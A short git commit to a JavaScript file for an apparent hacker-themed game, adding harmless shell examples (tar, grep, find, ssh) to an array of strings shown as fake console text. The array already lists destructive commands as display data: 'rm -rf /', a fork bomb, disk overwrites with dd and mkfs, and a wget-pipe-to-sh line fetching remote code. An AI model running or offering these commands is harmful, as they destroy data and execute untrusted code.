8b0a12ca3f647a1aae827830d2ba0ec5195b5d91
Torinberger <torinberger@torinberger.com>
2018-06-07 10:08:02 +1000

    added bunch of normal commands

--- src/game.js
+++ src/game.js
@@ -1,10 +1,12 @@
 
-var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda"]
+var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda", "tar cvf archive_name.tar dirname/", "tar xvf archive_name.tar", "grep -i 'the' demo_file", "find -iname 'MyCProgram.c'", "find ~ -empty", "ssh -l jsmith remotehost.example.com", "sed 's/.$//' filename", " awk '!($0 in array) { array[$0]; print }' temp"]
 
 // # Console
 
 $(document).ready(function () {
+  /*
   for (var i = 0; i < commands.length; i++) {
     $("#console-text").append("<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[i]+"</p>");
   }
+  */
 });
